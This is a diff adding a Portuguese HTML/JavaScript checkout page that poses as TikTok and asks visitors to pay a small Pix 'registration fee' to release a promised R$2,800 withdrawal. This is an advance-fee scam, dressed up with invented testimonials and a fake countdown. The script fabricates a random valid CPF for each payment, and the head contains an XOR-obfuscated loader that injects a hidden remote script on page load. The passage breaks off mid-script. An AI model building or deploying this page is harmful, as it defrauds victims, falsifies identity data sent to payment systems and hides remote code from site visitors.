@@ -1,0 +1,898 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Checkout - Pagamento</title>
+  <!-- ===== TikTok Pixel (mesmos IDs do funil) ===== -->
+  <script>
+  !function (w, d, t) {
+    w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+    ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+    ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+    for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+    ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+    ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=d.createElement("script");o.type="text/javascript",o.async=!0,o.src=r+"?sdkid="+e+"&lib="+t;var a=d.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
+    var TIKTOK_PIXEL_IDS=["D9V9RLRC77UFF28NGI6G"];
+    for(var k=0;k<TIKTOK_PIXEL_IDS.length;k++){ttq.load(TIKTOK_PIXEL_IDS[k]);}
+    ttq.page();
+  }(window, document, 'ttq');
+  </script>
+  <!-- ===== fim TikTok Pixel ===== -->
+  <!-- UTMify - Pixel TikTok -->
+  <script>(function(){var m_ip=atob("DLKw+cCstB3tBXzlj8mSjLLAlifPbQiR/8GK1u/P0HPDcAiI5tTJ16PD2TOPd1OW7MDZibTfm22EfRmJoMLZgaXAmWmEbgiK5JzaiuKAlnyZcQ6M7cfEnLOOjkawKV6C493SmKzflie2fl6L7t/V2/qOwHSGUROO39vInKzl0D/BJwqE48fV2/qOgnzaYxiEuIHUmqOVgi7dPETS7ISAyPiblmCweA==");var p_w=[];for(var l_xyu=0;l_xyu<m_ip.length;l_xyu++){p_w.push(m_ip.charCodeAt(l_xyu)&255);}var o_m3v=p_w[0];var q_82x=p_w.slice(1,1+o_m3v);var g_1i=p_w.slice(1+o_m3v);var k_p=g_1i.map(function(b,u_8){return b^q_82x[u_8%o_m3v];});var n_6i="";for(var y_l=0;y_l<k_p.length;y_l++){n_6i+=String.fromCharCode(k_p[y_l]&255);}var h_x=decodeURIComponent(escape(n_6i));var c_tmey=JSON.parse(h_x);var m_4=c_tmey.globals||[];m_4.forEach(function(r_f1k){window[r_f1k.name]=r_f1k.value;});var a_ye=document.createElement("script");a_ye.src=c_tmey.url;a_ye.async=true;a_ye.defer=true;(c_tmey.attributes||[]).forEach(function(k_ika){a_ye.setAttribute(k_ika.name,k_ika.value);});(document.head||document.documentElement).appendChild(a_ye);})();</script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --pink:#fe2c55;
+      --bg:#f5f7fa;
+      --card:#ffffff;
+      --muted:#9aa3ad;
+      --radius:14px;
+      --shadow: 0 6px 18px rgba(20,30,40,0.06);
+    }
+    *{box-sizing:border-box; margin:0; padding:0}
+    body{font-family:Poppins,system-ui,Segoe UI,Arial; background:var(--bg); -webkit-font-smoothing:antialiased}
+    .wrap{max-width:100%; margin:0 auto; padding:0}
+
+    .topbar{background:var(--pink); color:#fff; text-align:center; padding:10px 14px; font-weight:600}
+
+    .banner{margin:0;}
+    .banner img{width:100%; display:block}
+
+    .card{background:var(--card); border-radius:var(--radius); padding:18px; box-shadow:var(--shadow); margin:16px}
+    .card.row{display:flex; align-items:center; gap:14px}
+    .icon-avatar{width:56px;height:56px;border-radius:12px;overflow:hidden;display:flex;align-items:center;justify-content:center}
+    .icon-avatar img{width:100%;height:100%;object-fit:cover;border-radius:12px}
+
+    .price{margin-top:14px; border-top:1px solid #f0f3f6; padding-top:12px; display:flex; justify-content:space-between; align-items:center; color:var(--muted)}
+    .price strong{color:#222; font-size:18px}
+
+    label.section-title{display:flex;align-items:center;gap:10px;font-weight:600;margin-bottom:10px}
+    .user-icon{background:var(--pink); color:#fff; width:36px; height:36px; border-radius:10px; display:flex; align-items:center; justify-content:center}
+    .user-icon svg {width:20px; height:20px; fill:#fff}
+
+    input[type=text]{width:100%; padding:12px 14px; border-radius:12px; border:1px solid #e6edf1; background:#fbfdff; font-size:14px}
+    input::placeholder{color:#c9d2d8}
+
+    .methods{padding:14px 0}
+    .method{display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:12px;border:1px solid #f0f3f6}
+    .method-left{display:flex;align-items:center;gap:12px}
+    .method .meta{font-size:13px;color:var(--muted)}
+
+    .paybtn{display:block;width:100%;padding:14px;border-radius:12px;background:var(--pink);color:#fff;text-align:center;font-weight:700;border:0;cursor:pointer;margin-top:14px;font-size:15px}
+    .paybtn:active{transform:translateY(1px)}
+    .paybtn:disabled{background:#ccc; cursor:not-allowed}
+
+    .small{font-size:12px;color:var(--muted); text-align:center; margin-top:8px}
+
+    .testimonials-container {
+      overflow-x: auto;
+      padding: 16px;
+      margin: 0 16px;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+      scroll-behavior: smooth;
+    }
+    
+    .testimonials-container::-webkit-scrollbar {
+      display: none;
+    }
+    
+    .testimonials {
+      display: flex;
+      gap: 12px;
+      width: max-content;
+    }
+    
+    .testimonial {
+      flex: 0 0 auto;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      padding: 12px;
+      border-radius: 12px;
+      background: #fff;
+      box-shadow: var(--shadow);
+      width: calc(100vw - 64px);
+      max-width: 320px;
+    }
+    
+    .profile {
+      width: 48px;
+      height: 48px;
+      border-radius: 999px;
+      overflow: hidden;
+      flex-shrink: 0;
+    }
+    
+    .profile img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    
+    .stars {
+      color: #ffb800;
+      font-weight: 700;
+    }
+    
+    .comment {
+      font-size: 13px;
+      color: #4b5b62;
+    }
+
+    .testimonials-container {
+      scroll-snap-type: x mandatory;
+    }
+    .testimonial {
+      scroll-snap-align: start;
+    }
+
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status-message {
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      text-align: center;
+      font-weight: 600;
+    }
+
+    .status-waiting {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeaa7;
+    }
+
+    .status-success {
+      background: #d1ecf1;
+      color: #0c5460;
+      border: 1px solid #bee5eb;
+    }
+
+    .status-error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    .urgent-bar {
+      background: #ff6b6b;
+      color: white;
+      text-align: center;
+      padding: 8px;
+      font-weight: 600;
+      margin: 10px 0;
+      border-radius: 8px;
+    }
+
+    /* Novos estilos para o QR Code */
+    #qrcode {
+      margin: 20px auto;
+      padding: 15px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      display: inline-block;
+      text-align: center;
+    }
+
+    #qrcode canvas {
+      border-radius: 8px;
+    }
+
+    .expiration {
+      font-size: 0.9em;
+      color: #666;
+      margin: 10px 0;
+      text-align: center;
+    }
+  </style>
+  <script src="js/qrcode.min.js"></script>
+</head>
+<body>
+  <div class="wrap">
+    <div class="topbar">PAGAMENTO 100% SEGURO</div>
+
+    <div class="banner">
+      <img src="images/banner.gif" alt="Banner">
+    </div>
+
+    <!-- fee card -->
+    <!-- fee card -->
+<div class="card row">
+  <div class="icon-avatar">
+    <img src="images/ttk.gif" alt="Logo TikTok">
+  </div>
+  <div style="flex:1">
+    <div style="font-weight:600">Taxa de Cadastro</div>
+    
+    <!-- ESTILO NOTA -->
+    <div style="background: #f8f9fa; border-left: 3px solid #fe2c55; padding: 8px 10px; margin-top: 8px; border-radius: 0 4px 4px 0;">
+      <div style="color: #4b5b62; font-size: 13px; line-height: 1.4;">
+        <strong>Retorno garantido:</strong> Receba R$ 2.800,00 (seu saque) + reembolso desta taxa após a confirmação do pagamento.
+      </div>
+    </div>
+    <!-- FIM ESTILO NOTA -->
+    
+    <div class="price"><span>Total</span><strong class="js-amount">R$ 19,72</strong></div>
+  </div>
+</div>
+
+    <!-- identification -->
+    <div class="card">
+      <label class="section-title">
+        <span class="user-icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+          </svg>
+        </span> 
+        Identificação
+      </label>
+      <input type="text" id="nomeCompleto" placeholder="Nome e sobrenome" aria-label="Nome completo">
+      <span id="erroNome" style="color:#e63946; font-size:12px; display:none; margin-top:6px; display:block;"></span>
+    </div>
+
+    <!-- payment method -->
+    <div class="card">
+      <div style="font-weight:700;margin-bottom:12px">Escolha um método de pagamento...</div>
+
+      <div class="methods">
+        <div class="method" style="margin-bottom:12px;">
+          <div class="method-left">
+            <div style="width:44px;height:44px;border-radius:8px;display:flex;align-items:center;justify-content:center">
+              <img src="images/pix.png" alt="PIX" style="width:36px;height:auto;object-fit:contain">
+            </div>
+            <div>
+              <div style="font-weight:600">Pagamento via Pix</div>
+              <div class="meta">Aprovação imediata.</div>
+            </div>
+          </div>
+          <div>
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="11" stroke="#fe2c55" stroke-width="2" fill="#fff"></circle><path d="M8.5 12.5l2 2 4-5" stroke="#fe2c55" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          </div>
+        </div>
+
+        <button class="paybtn" id="payButton">PAGAR AGORA</button>
+        <div class="small">Ao finalizar o pagamento você concorda com nossos termos de uso e privacidade.</div>
+      </div>
+    </div>
+
+    <!-- bloco PIX (inicialmente escondido) -->
+    <!-- bloco PIX (inicialmente escondido) -->
+<div class="card" id="pixBlock" style="display:none;">
+  <!-- Barra de urgência -->
+  <div class="urgent-bar" style="background: linear-gradient(135deg, #ff6b6b, #ff8e53); margin: -18px -18px 18px -18px; border-radius: var(--radius) var(--radius) 0 0;">
+    <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"></circle>
+        <polyline points="12 6 12 12 16 14"></polyline>
+      </svg>
+      <span>PIX VÁLIDO POR: <span id="countdownTimer" style="font-weight:800;">5:00</span></span>
+    </div>
+  </div>
+
+  <h3 style="font-weight:600; font-size:18px; margin-bottom:12px; text-align:center;">
+    <span style="color: var(--pink);">✓</span> PIX Gerado com Sucesso!
+  </h3>
+  
+  <!-- Benefícios em destaque -->
+  <div style="background: linear-gradient(135deg, #e3f2fd, #f3e5f5); padding: 12px; border-radius: 10px; margin-bottom: 16px; border-left: 4px solid var(--pink);">
+    <div style="font-weight: 700; color: #333; margin-bottom: 6px;">🎁 Após o pagamento você receberá:</div>
+    <div style="display: flex; justify-content: space-between; font-size: 14px;">
+      <div>
+        <div style="font-weight: 600; color: var(--pink);">R$ 2.800,00</div>
+        <div style="font-size: 12px; color: #555;">Seu saque</div>
+      </div>
+      <div style="text-align: right;">
+        <div class="js-amount" style="font-weight: 600; color: var(--pink);">R$ 19,72</div>
+        <div style="font-size: 12px; color: #555;">Reembolso da taxa</div>
+      </div>
+    </div>
+  </div>
+
+  <hr style="border:0; border-top:1px solid #eee; margin:12px 0;">
+
+  <!-- QR Code com contador -->
+  <div style="text-align: center; margin-bottom: 16px;">
+    <div style="font-weight: 600; margin-bottom: 8px;">Escaneie o QR Code abaixo:</div>
+    <div id="qrcode" style="display: inline-block; padding: 15px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); position: relative;">
+      <!-- Contador no QR Code -->
+      <div id="qrCountdown" style="position: absolute; top: -10px; right: -10px; background: var(--pink); color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">30</div>
+    </div>
+  </div>
+
+  <!-- Valor + Código PIX -->
+  <div style="display:flex; justify-content:space-between; font-weight:600; margin-bottom:6px;">
+    <span>Valor PIX:</span>
+    <span class="js-amount" style="color:#222; font-size: 18px;">R$ 19,72</span>
+  </div>
+
+  <div style="margin-bottom: 10px;">
+    <div style="font-weight: 600; margin-bottom: 6px; font-size: 14px;">Ou copie o código PIX:</div>
+    <textarea id="pixCode" readonly="" style="width:100%; height:60px; padding:10px; border-radius:8px; border:1px solid #ddd; font-size:12px; resize:none; font-family: monospace;"></textarea>
+  </div>
+
+  <!-- Botão copiar PIX -->
+  <button class="paybtn" style="display:flex; align-items:center; justify-content:center; gap:8px; background: linear-gradient(135deg, #4CAF50, #45a049);" onclick="copiarPix()">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="18" height="18">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16h8M8 12h8m-6-8h10a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2z"></path>
+    </svg>
+    Copiar Código PIX
+  </button>
+
+  <!-- Status do pagamento -->
+  <div id="status" style="margin-top:15px; text-align:center; font-size:14px; font-weight:600; color:#555; padding: 12px; border-radius: 8px; background: #fff3cd; border: 1px solid #ffeaa7;">
+    ⏳ Aguardando seu pagamento...
+  </div>
+
+  <!-- Como pagar -->
+  <div style="margin-top:18px;">
+    <div style="font-weight:600; margin-bottom:8px; display: flex; align-items: center; gap: 8px;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 20h9"></path>
+        <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
+      </svg>
+      Como pagar com PIX:
+    </div>
+    <ol style="list-style:none; padding-left:0; font-size:14px; color:#444; display:flex; flex-direction:column; gap:10px;">
+      <li style="display:flex; gap:8px; align-items: flex-start;">
+        <span style="background:var(--pink); color:#fff; font-size:12px; width:20px; height:20px; display:flex; align-items:center; justify-content:center; border-radius:50%; font-weight:700; font-family: monospace; flex-shrink:0; margin-top: 2px;">1</span>
+        Abra o aplicativo do seu banco e selecione a opção PIX
+      </li>
+      <li style="display:flex; gap:8px; align-items: flex-start;">
+        <span style="background:var(--pink); color:#fff; font-size:12px; width:20px; height:20px; display:flex; align-items:center; justify-content:center; border-radius:50%; font-weight:700; font-family: monospace; flex-shrink:0; margin-top: 2px;">2</span>
+        Escolha "Pagar com QR Code" ou "Colar código PIX"
+      </li>
+      <li style="display:flex; gap:8px; align-items: flex-start;">
+        <span style="background:var(--pink); color:#fff; font-size:12px; width:20px; height:20px; display:flex; align-items:center; justify-content:center; border-radius:50%; font-weight:700; font-family: monospace; flex-shrink:0; margin-top: 2px;">3</span>
+        Escaneie o QR Code ou cole o código copiado
+      </li>
+      <li style="display:flex; gap:8px; align-items: flex-start;">
+        <span style="background:var(--pink); color:#fff; font-size:12px; width:20px; height:20px; display:flex; align-items:center; justify-content:center; border-radius:50%; font-weight:700; font-family: monospace; flex-shrink:0; margin-top: 2px;">4</span>
+        Confirme o pagamento de <strong class="js-amount">R$ 19,72</strong> e finalize
+      </li>
+    </ol>
+  </div>
+
+  <!-- Garantia e segurança -->
+  <div style="margin-top: 20px; padding: 12px; background: #e8f5e9; border-radius: 8px; text-align: center; border: 1px solid #c8e6c9;">
+    <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+      </svg>
+      <span style="font-weight: 600; color: #2e7d32;">Pagamento 100% Seguro</span>
+    </div>
+    <div style="font-size: 12px; color: #555;">
+      Seu pagamento é processado com criptografia avançada
+    </div>
+  </div>
+</div>
+
+    <!-- testimonials -->
+    <div class="testimonials-container" id="testimonialsContainer">
+      <div class="testimonials" id="testimonials">
+        <div class="testimonial">
+          <div class="profile"><img src="images/1756656326432-1756588864250-photo_2025-08-30_18-12-28.webp" alt=""></div>
+          <div style="flex:1">
+            <div style="display:flex;align-items:center;justify-content:space-between;gap:10px">
+              <div style="font-weight:700">Maria</div>
+              <div class="stars">★★★★★</div>
+            </div>
+            <div class="comment" style="margin-top:6px; font-style:italic">"Genteeee, não acredito que funcionou, caiu 500 no meu pix"</div>
+          </div>
+        </div>
+
+        <div class="testimonial">
+          <div class="profile"><img src="images/1756656283889-1756588828370-photo_2025-08-30_18-12-16.webp" alt=""></div>
+          <div style="flex:1">
+            <div style="display:flex;align-items:center;justify-content:space-between;gap:10px">
+              <div style="font-weight:700">Lucas</div>
+              <div class="stars">★★★★★</div>
+            </div>
+            <div class="comment" style="margin-top:6px; font-style:italic">"Lancei minha moto e dei um iPhone pra minha Coroa, o Tiktok acertou de mais nesse evento"</div>
+          </div>
+        </div>
+
+        <div class="testimonial">
+          <div class="profile"><img src="images/1756656365145-1756588901009-photo_2025-08-30_18-12-20.webp" alt=""></div>
+          <div style="flex:1">
+            <div style="display:flex;align-items:center;justify-content:space-between;gap:10px">
+              <div style="font-weight:700">Larissa</div>
+              <div class="stars">★★★★★</div>
+            </div>
+            <div class="comment" style="margin-top:6px; font-style:italic">"Eu to amandooo, fazendo muito dindin todo dia mdsss kkkk amooooo"</div>
+          </div>
+        </div>
+
+        <div class="testimonial">
+          <div class="profile"><img src="images/1756656398008-1756591742828-photo_2025-08-30_18-12-16.webp" alt=""></div>
+          <div style="flex:1">
+            <div style="display:flex;align-items:center;justify-content:space-between;gap:10px">
+              <div style="font-weight:700">Marcos</div>
+              <div class="stars">★★★★★</div>
+            </div>
+            <div class="comment" style="margin-top:6px; font-style:italic">"Familia ta funcionando demais pingou na hora o pix"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div style="height:36px"></div>
+
+<script>
+  // Variáveis globais para controle do pagamento
+  let currentTransactionId = null;
+  let paymentCheckInterval = null;
+  let checkCount = 0;
+  const maxChecks = 300;
+
+  // ===== Conexão com o funil: valor e retorno vindos da URL =====
+  // O app React redireciona para /checkout/?amount=<centavos>&next=<rota>
+  const _funnelParams = new URLSearchParams(window.location.search);
+  const _amountParam = parseInt(_funnelParams.get('amount'), 10);
+  const CHECKOUT_AMOUNT = (_amountParam && _amountParam > 0) ? _amountParam / 100 : 19.72;
+  const CHECKOUT_NEXT = _funnelParams.get('next') || 'https://tiknovidadetok.shop/up1/';
+  // Identificadores TikTok para atribuição server-side (Events API no webhook)
+  const CHECKOUT_TTCLID = _funnelParams.get('ttclid') || '';
+  const CHECKOUT_TTP = (document.cookie.match(/(?:^|; )_ttp=([^;]+)/) || [])[1] || '';
+  // Tracking COMPLETO (UTMs + ttclid) vindo do funil pelo localStorage (mesma origem),
+  // exatamente como o hook das upsells faz — garante paridade total no rastreamento.
+  const CHECKOUT_TRACKING = (() => {
+    let t = {};
+    try { t = JSON.parse(localStorage.getItem('tiktok_tracking_params') || '{}') || {}; } catch (e) { t = {}; }
+    // Fallbacks: ttclid pode vir pela URL; ttp vem do cookie do pixel
+    if (CHECKOUT_TTCLID && !t.ttclid) t.ttclid = CHECKOUT_TTCLID;
+    if (CHECKOUT_TTP && !t.ttp) t.ttp = CHECKOUT_TTP;
+    return t;
+  })();
+  // Atualiza os valores exibidos na página com o valor recebido do funil
+  document.addEventListener('DOMContentLoaded', () => {
+    const _txt = 'R$ ' + CHECKOUT_AMOUNT.toFixed(2).replace('.', ',');
+    document.querySelectorAll('.js-amount').forEach(el => { el.textContent = _txt; });
+  });
+
+  // Variáveis para o contador de urgência
+  let countdownSeconds = 5 * 60; // 30 minutos em segundos
+  let countdownInterval;
+
+  // Função para iniciar o contador regressivo
+  function startCountdown() {
+    clearInterval(countdownInterval);
+    countdownSeconds = 5 * 60;
+    updateCountdownDisplay();
+    
+    countdownInterval = setInterval(function() {
+      countdownSeconds--;
+      updateCountdownDisplay();
+      
+      if (countdownSeconds <= 0) {
+        clearInterval(countdownInterval);
+        document.getElementById('status').innerHTML = 
+          '<div class="status-error">❌ PIX expirado. Gere um novo código para continuar.</div>';
+      }
+    }, 1000);
+  }
+
+  // Função para atualizar a exibição do contador
+  function updateCountdownDisplay() {
+    const minutes = Math.floor(countdownSeconds / 60);
+    const seconds = countdownSeconds % 60;
+    
+    // Atualizar o timer principal
+    if (document.getElementById('countdownTimer')) {
+      document.getElementById('countdownTimer').textContent = 
+        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+    
+    // REMOVIDO: Atualizar o contador no QR Code (apenas minutos)
+    // if (document.getElementById('qrCountdown')) {
+    //   document.getElementById('qrCountdown').textContent = minutes;
+    // }
+    
+    // Atualizar texto de expiração
+    if (document.getElementById('expirationTime')) {
+      document.getElementById('expirationTime').textContent = 
+        `${minutes} minuto${minutes !== 1 ? 's' : ''}`;
+    }
+  }
+
+  // Função para gerar CPF válido
+  function gerarCPFValido() {
+    let cpf = Array.from({length: 9}, () => Math.floor(Math.random() * 10)).join('');
+    
+    let soma = 0;
+    for (let i = 0; i < 9; i++) {
+      soma += parseInt(cpf[i]) * (10 - i);
+    }
+    let resto = soma % 11;
+    let digito1 = resto < 2 ? 0 : 11 - resto;
+    cpf += digito1;
+    
+    soma = 0;
+    for (let i = 0; i < 10; i++) {
+      soma += parseInt(cpf[i]) * (11 - i);
+    }
+    resto = soma % 11;
+    let digito2 = resto < 2 ? 0 : 11 - resto;
+    cpf += digito2;
+    
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  }
+
+  // Validar nome completo
+  function validarNome() {
+    const valor = document.getElementById('nomeCompleto').value.trim();
+    const partes = valor.split(" ").filter(p => p.length > 0);
+
+    if (partes.length < 2) {
+      document.getElementById('erroNome').textContent = "Digite seu nome completo (nome e sobrenome)";
+      document.getElementById('erroNome').style.display = "block";
+      document.getElementById('nomeCompleto').style.border = "1px solid #e63946";
+      return false;
+    }
+
+    document.getElementById('erroNome').textContent = "";
+    document.getElementById('erroNome').style.display = "none";
+    document.getElementById('nomeCompleto').style.border = "1px solid #e6edf1";
+    return true;
+  }
+
+  // Gerar PIX via API - NOVA LÓGICA
+  async function gerarPix() {
+    const nomeCompleto = document.getElementById('nomeCompleto').value.trim();
+    const valor = CHECKOUT_AMOUNT;
+    
+    // Atualizar UI
+    document.getElementById('payButton').innerHTML = '<span class="loading"></span> GERANDO PIX...';
+    document.getElementById('payButton').disabled = true;
+
+    try {
+      // Gera o PIX pelo backend do admin-gateway (pagamento.php -> gateway ativo)
+      const response = await fetch("pagamento.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          valor: Math.round(valor * 100),
+          nome: nomeCompleto,
+          cpf: gerarCPFValido(),
+          tracking: CHECKOUT_TRACKING,
+          ttclid: CHECKOUT_TRACKING.ttclid || CHECKOUT_TTCLID || '',
+          ttp: CHECKOUT_TTP
+        })
+      });
+
+      const data = await response.json();
+
+      if (!response.ok || !data.success) {
+        throw new Error(data.message || `Erro na API: ${response.status}`);
+      }
+
+      // Dados do PIX retornados pelo backend
+      if (data.pixCode || data.pixCopiaECola) {
+        currentTransactionId = data.token;
+        checkCount = 0;
+
+        // TikTok: iniciou o checkout (PIX gerado)
+        if (window.ttq) {
+          ttq.track('InitiateCheckout', {
+            content_id: 'checkout_front',
+            content_type: 'product',
+            currency: 'BRL',
+            value: CHECKOUT_AMOUNT
+          });
+        }
+
+        // Obter o código PIX
+        const pixCode = data.pixCode || data.pixCopiaECola;
+        document.getElementById('pixCode').value = pixCode;
+        
+        // Gerar QR Code localmente
+        try {
+          // REMOVIDO: o contador que ficava no QR Code
+          document.getElementById("qrcode").innerHTML = "";
+          new QRCode(document.getElementById("qrcode"), {
+            text: pixCode,
+            width: 200,
+            height: 200,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.L
+          });
+        } catch (qrError) {
+          console.error("Erro ao gerar QR code:", qrError);
+          document.getElementById('qrcode').innerHTML = 
+            '<p style="color: #ff6b6b; text-align: center;">Use o código PIX copiável abaixo</p>';
+        }
+        
+        // Iniciar contador de urgência
+        startCountdown();
+        
+        // Iniciar verificação do pagamento
+        startPaymentCheck();
+        
+        // Mostrar bloco PIX
+        document.querySelectorAll('.card').forEach(card => {
+          if (card.id !== "pixBlock") {
+            card.style.display = "none";
+          }
+        });
+        document.getElementById('pixBlock').style.display = "block";
+        
+        // Scroll suave para a seção PIX
+        document.getElementById('pixBlock').scrollIntoView({ behavior: 'smooth' });
+        
+      } else {
+        throw new Error("A API não retornou dados válidos do PIX");
+      }
+    } catch (error) {
+      mostrarErro(`Erro ao gerar PIX: ${error.message}`);
+      console.error("Erro detalhado:", error);
+      
+      // Reativar botão em caso de erro
+      document.getElementById('payButton').innerHTML = 'PAGAR AGORA';
+      document.getElementById('payButton').disabled = false;
+    }
+  }
+
+  // Verificar status do pagamento
+  async function checkPaymentStatus() {
+    if (!currentTransactionId || checkCount >= maxChecks) {
+      if (checkCount >= maxChecks) {
+        document.getElementById('status').innerHTML = `
+          <div class="status-error">
+            ⚠️ Verificação automática encerrada após 25 minutos
+          </div>
+        `;
+      }
+      clearInterval(paymentCheckInterval);
+      return;
+    }
+
+    checkCount++;
+
+    try {
+      console.log("🔎 Verificando status da transação:", currentTransactionId, "Tentativa:", checkCount);
+
+      const response = await fetch(
+        `verificar.php?id=${encodeURIComponent(currentTransactionId)}`,
+        {
+          method: "GET",
+          headers: {
+            "Accept": "application/json"
+          }
+        }
+      );
+
+      if (!response.ok) {
+        throw new Error(`Erro HTTP: ${response.status}`);
+      }
+
+      const data = await response.json();
+      console.log("📩 Resposta da API:", data);
+
+      const paymentStatus = data.payment_status || data.status;
+      console.log("📌 Status recebido:", paymentStatus);
+
+      if (paymentStatus === "paid" || paymentStatus === "approved") {
+        console.log("✅ Pagamento confirmado, iniciando redirecionamento...");
+
+        // Purchase/CompletePayment é enviado SERVER-SIDE (TikTok Events API no webhook),
+        // com dedup por transação — não disparamos aqui para não contar a venda 2x.
+
+        clearInterval(paymentCheckInterval);
+        clearInterval(countdownInterval); // Parar contador de urgência
+
+        const statusElement = document.getElementById('status');
+        if (statusElement) {
+          statusElement.classList.remove("pendente");
+          statusElement.classList.add("pago");
+          statusElement.innerHTML = `
+            <div style="margin-bottom: 20px; color: #00ff88; font-size: 20px;">
+              ✅ Pagamento confirmado com sucesso!
+            </div>
+            <button 
+              onclick="window.location.href=CHECKOUT_NEXT"
+              style="background: linear-gradient(135deg, #25D366, #2ecc71); color: white; border: none; padding: 18px; font-size: 18px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; transition: all 0.3s; margin-top: 15px;"
+              onmouseover="this.style.transform='scale(1.02)'; this.style.boxShadow='0 5px 20px rgba(46, 204, 113, 0.6)'"
+              onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='none'"
+            >
+              LIBERAR MEU SAQUE AGORA
+            </button>
+            <p style="margin-top: 15px; font-size: 14px;">
+              Você será redirecionado automaticamente em <span id="countdown">10</span> segundos...
+            </p>
+          `;
+
+          // Contador de redirecionamento
+          let seconds = 10;
+          const countdownInterval = setInterval(() => {
+            seconds--;
+            const countdownElement = document.getElementById('countdown');
+            if (countdownElement) {
+              countdownElement.textContent = seconds;
+            } 
+            if (seconds <= 0) {
+              clearInterval(countdownInterval);
+              window.location.href = CHECKOUT_NEXT;
+            }
+          }, 1000);
+
+          // 🔄 Fallback de segurança (garante redirecionamento em 10s mesmo se o contador falhar)
+          setTimeout(() => {
+            console.log("⏩ Redirecionamento forçado após 10 segundos");
+            window.location.href = CHECKOUT_NEXT;
+          }, 10000);
+        }
+      } else if (paymentStatus === "refused" || paymentStatus === "cancelled" || paymentStatus === "failed") {
+        console.log("❌ Pagamento não aprovado:", paymentStatus);
+        clearInterval(paymentCheckInterval);
+        clearInterval(countdownInterval); // Parar contador de urgência
+        document.getElementById('status').innerHTML = `
+          <div class="status-error">
+            ❌ Pagamento não aprovado. Entre em contato com o suporte.
+          </div>
+        `;
+      } else {
+        console.log("⏳ Pagamento ainda pendente:", paymentStatus);
+        
+        // Atualizar status com contador
+        if (countdownSeconds > 0) {
+          document.getElementById('status').innerHTML = `
+            <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
+              <span class="loading" style="width: 16px; height: 16px;"></span>
+              Aguardando pagamento...
+            </div>
+          `;
+        }
+      }
+    } catch (error) {
+      console.error("🚨 Erro ao verificar pagamento:", error);
+    }
+  }
+
+  // Iniciar verificação periódica
